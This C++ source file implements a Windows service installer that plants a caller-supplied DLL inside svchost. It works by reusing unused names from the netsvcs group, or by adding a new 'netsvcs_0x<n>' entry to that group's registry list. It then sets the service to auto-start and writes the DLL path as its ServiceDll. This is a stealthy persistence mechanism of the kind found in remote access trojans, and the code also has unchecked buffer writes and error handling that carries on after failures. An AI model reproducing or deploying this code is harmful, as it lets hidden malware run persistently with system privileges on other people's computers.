#include "ServicesControl.h"

#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.RegistryControl.lib")
#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.FileControl.lib")

CServicesControl::CServicesControl(void)
{
}


CServicesControl::~CServicesControl(void)
{
}


LPTSTR CServicesControl::AddsvchostService()
{
	int rc = 0;
	HKEY hkRoot;
	char buff[2048];
	memset(buff,0,2048);

	LPTSTR lpServiceName = NULL;
	//query svchost setting
	LPSTR ptr,pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
	rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
	if(ERROR_SUCCESS != rc)
		return NULL;

	DWORD type, size = sizeof (buff);
	rc = RegQueryValueExA(hkRoot,"netsvcs",0,&type,(LPBYTE)buff, &size);
	SetLastError(rc);
	if(ERROR_SUCCESS != rc)
		RegCloseKey(hkRoot);

	int i = 0;
	bool bExist = false;
	char servicename[50] = {0};
	do
	{	
		sprintf(servicename, "netsvcs_0x%d", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpiA(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);

	servicename[lstrlenA(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlenA(servicename) + 2);

	rc = RegSetValueExA(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlenA(servicename) + 1);

	RegCloseKey(hkRoot);

	SetLastError(rc);

	if (bExist == false)
	{
		ULONG lLen = lstrlenA(servicename) + 1;
		lpServiceName = new TCHAR[lLen];

#ifdef UNICODE
		MultiByteToWideChar( CP_ACP, 0, servicename, -1, lpServiceName,lLen); 
#else
		strcpy(lpServiceName,servicename);
#endif
	}

	return lpServiceName;
}


LPCTSTR CServicesControl::InstallServiceRandom(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,LPCTSTR lpModulePath)
{
	// Open a handle to the SC Manager database.
	LPTSTR lpServiceName = NULL;
	SC_HANDLE hscm = NULL, schService = NULL;
	DWORD	dwStartType = 0;


	LPCTSTR pszServicesExecPath = _T("%SystemRoot%\\System32\\svchost.exe -k netsvcs");

	try{


		m_cRegistryControlTool.SetRoot(HKEY_LOCAL_MACHINE);

		//query svchost setting
		LPTSTR ptr = NULL;

		if(!m_cRegistryControlTool.Open(_T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost")))
		{
			return _T("");
		}

		if(!m_cRegistryControlTool.Read(_T("netsvcs"),m_szServiceName,sizeof(m_szServiceName)))
		{
			return _T("");
			//throw "RegQueryValueEx(Svchost\\netsvcs)";
		}

		//install service
		hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

		if (hscm == NULL)
		{
			return _T("");
			//throw "OpenSCManager()";
		}


		for(ptr = m_szServiceName; *ptr; ptr = _tcschr(ptr, 0)+1)
		{
			//////////////////////////////////////////////////////////////////////////
			if (!m_cRegistryControlTool.Open(_T("SYSTEM\\CurrentControlSet\\Services")) && !m_cRegistryControlTool.Open(ptr,false))
			{
				continue;
			}

			schService = CreateService(hscm,ptr,lpServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_SHARE_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,pszServicesExecPath,NULL,NULL,NULL,NULL,NULL);                     // no password

			if (schService != NULL)
				break;
		}

		if (schService == NULL)
		{
			lpServiceName = AddsvchostService();

			if (NULL != lpServiceName)
			{
				_tcscpy_s(m_szServiceName,1024,lpServiceName);
				delete [] lpServiceName;
				lpServiceName = m_szServiceName;
			}

			schService = CreateService(hscm,lpServiceName,lpServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,pszServicesExecPath,NULL,NULL,NULL,NULL,NULL);                     // no password
			
			dwStartType = SERVICE_WIN32_OWN_PROCESS;
		}
		else
		{
			dwStartType = SERVICE_WIN32_SHARE_PROCESS;

			lpServiceName = ptr;
		}

		if (schService == NULL)
		{
			return _T("");
			//throw "CreateService(Parameters)";
		}

		CloseServiceHandle(schService);
		CloseServiceHandle(hscm);

		//config service
		m_cRegistryControlTool.SetRoot(HKEY_LOCAL_MACHINE);
		m_cRegistryControlTool.Open(_T("SYSTEM\\CurrentControlSet\\Services"));
		m_cRegistryControlTool.Open(lpServiceName,false);


		if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
		{		
			DWORD	dwServiceType = 0x120;
			m_cRegistryControlTool.Write(_T("Type"),dwServiceType);
		}

		m_cRegistryControlTool.Write(_T("Description"),lpServiceDescription);

		m_cRegistryControlTool.Open(_T("Parameters"),false);

		m_cRegistryControlTool.Write(_T("ServiceDll"),lpModulePath);

	}catch(...)
	{
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);

	return lpServiceName;
}

bool CServicesControl::StartService(LPCTSTR lpService)
{
	bool bRet = false;

	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			bRet = ::StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}

	return bRet;
}
